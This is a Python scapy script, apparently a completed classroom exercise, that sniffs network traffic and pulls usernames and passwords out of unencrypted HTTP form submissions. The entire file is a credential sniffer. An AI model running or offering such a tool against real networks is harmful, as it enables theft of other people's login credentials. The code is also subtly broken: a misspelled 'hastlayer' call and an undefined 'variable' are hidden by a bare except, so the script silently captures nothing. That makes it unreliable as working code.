from scapy.all import *
from urllib import parse
import re

iface = "Ethernet" # your computer's sniffing interface name

def get_login_pass(body):
    user = None
    passwd = None
    
    userfields = ['login', 'user', 'uname', 'username', 'nickname', 'userid', 'login_id', 'sessionkey', 'session_key', 'uname']
    
    passfields = ['password', 'passphrase', 'pass', 'passwd']
    
    for login in userfields:
        login_re = re.search('(%s=[^&]+)' % login, body, re.IGNORECASE)
        if login_re:
            user = login_re.group()
    
    ## Repeat the same block of code above for the password field
    ## -------------
    for password in passfields:
        password_re = re.search('(%s=[^&]+)' % password, body, re.IGNORECASE)
        if password_re:
            passwd = password_re.group()
    ## -------------
    
    if user and passwd:
        # return both
        ## -------------
        return (user, passwd)
        ## -------------
    
def pkt_parser(packet):
    try:
        ## if packet.haslayer is TCP and Raw and IP
            ## store TCP payload in a variable
            ## call the get_login_pass function and pass the variable, 
            ## store the return value in a variable as a list
            ## check if the return value is not empty and
                ## print TCP payload
                ## print(parse.unquote(variable[0])) for username
                ## print(parse.unquote(variable[1])) for password
        ## else:
            ## pass
    ## --------------
        if packet.haslayer(TCP) and packet.haslayer(IP) and packet.hastlayer(Raw):
            body = str(packet[TCP].payload)
            user_pass = get_login_pass(body)
            if user_pass != None:
                print(packet[TCP].payload)
                print(parse.unquote(variable[0]))
                print(parse.unquote(variable[1]))
            else:
                pass
        else:
            pass
    except:
        pass
    ## ---------------

def main():
    try:
        sniff(iface=iface, prn=pkt_parser, store=0)

    except KeyboardInterrupt:
        print('Exiting..')
        exit()
if __name__ == "__main__":
    main()